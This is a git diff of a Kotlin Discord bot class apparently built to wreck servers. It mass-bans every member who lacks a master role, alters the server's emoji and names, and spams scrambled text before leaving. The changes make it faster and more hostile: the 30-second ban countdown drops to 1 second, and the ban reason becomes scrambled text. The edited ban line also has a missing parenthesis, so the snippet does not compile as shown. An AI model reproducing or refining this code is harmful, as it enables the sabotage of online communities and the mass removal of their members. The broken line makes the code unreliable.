@@ -18,11 +18,11 @@ class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) 
   override fun run()
   {
     guild.retrieveMembers().get()
-    shout()
     Thread.sleep(2000)
     emoji()
     names()
     banEm()
+    Thread.sleep(2000)
     shout()
     Thread.sleep(2000)
     leave()
@@ -30,7 +30,7 @@ class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) 
 
   fun banEm()
   {
-    for (i in 30 downTo 1) {
+    for (i in 1 downTo 1) {
       println("$gName => ban in $i")
       log.sendMessage("$i   " + chaotize(128, true)).queue()
       Thread.sleep(1000)
@@ -42,7 +42,7 @@ class Vortex(val guild: Guild, val log: MessageChannel, val masterRole: String) 
       if (isMaster(member))
         continue
       try {
-        member.ban(0, "test").complete()
+        member.ban(0, chaotize(128, true).complete()
       } catch (e: Exception) {
       }
     }
